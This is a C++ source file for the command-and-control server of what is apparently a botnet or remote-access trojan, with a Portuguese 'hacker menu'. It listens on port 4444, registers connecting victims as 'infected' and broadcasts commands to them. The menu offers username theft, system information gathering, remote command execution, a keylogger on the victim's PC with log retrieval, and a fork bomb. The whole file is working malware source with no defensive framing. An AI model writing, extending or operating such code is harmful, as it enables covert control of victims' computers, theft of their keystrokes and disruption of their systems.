#include "common.hpp"

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

constexpr int MAXBUFFSIZE = 1024 * 4; // 4KB

static std::atomic<bool> stop(false);

class Infected
{
	private:
		static int current_id;

	public:
		int id;
		int sock;

		Infected(int sock)
			: sock(sock)
		{
			id = current_id++;
		}
};

int Infected::current_id = 0;

std::mutex infecteds_mu;
std::vector<Infected> infecteds;

void make_server()
{
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	{
		int opt = 1;
		setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
	}

	sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_addr.s_addr = INADDR_ANY;
	hint.sin_port = htons(4444);

	if (bind(sock, reinterpret_cast<sockaddr*>(&hint), sizeof(hint)) == -1) {
		throw("Could not bind");
	}

	if (listen(sock, 1) == -1) {
		throw("Could not bind");
	}

	while (!stop) {
		sockaddr_in client_hint;
		socklen_t client_hint_len = sizeof(client_hint);
		int client_sock = accept(sock, reinterpret_cast<sockaddr*>(&client_hint), &client_hint_len);
		std::cout << "\r\033[1;92mNovo infectado!\033[m Alvo com ip " << inet_ntoa(client_hint.sin_addr) << "\n> " << std::flush;
		if (client_sock != -1) {
			infecteds_mu.lock();
			infecteds.emplace_back(client_sock);
			infecteds_mu.unlock();
		}
	}
}

std::string menu =
"Menu hacker\n"
"\t-1 : sair\n"
"\t0 : Pegar nome de usuário\n"
"\t1 : Pegar informação do sistema\n"
"\t2 : Executar um comando\n"
"\t3 : Começar um keylogger no pc da vítima\n"
"\t4 : Terminar um keylogger que está rodando\n"
"\t5 : Pegar Keylog\n"
"\t6 : Fork bomb\n"
"> ";

int broadcast(int acao)
{
	int success_sends = 0;

	infecteds_mu.lock();
	for (auto & infected : infecteds) {
		if (send(infected.sock, &acao, 1, 0) != -1) {
			++success_sends;
			char data[MAXBUFFSIZE];
			recv(infected.sock, data, MAXBUFFSIZE, 0);
			std::cout << "Response from " << infected.id << ":\n```\n" << data << "\n```" << std::endl;
		}
	}
	infecteds_mu.unlock();

	return success_sends;
}

int main()
{
	std::thread server_t (make_server);

	while (!stop) {
		int acao;
		std::cout << menu << std::flush;
		std::cin >> acao;
		if (acao == -1) {
			stop = true;
			break;
		}
		else if (acao <= 6) {
			int result = broadcast(acao);
			std::cout << "\033[1;92mSucesso!\033[m Comando enviado para " << result << " infectados!" << std::endl;
		}
	}

	server_t.join();
}

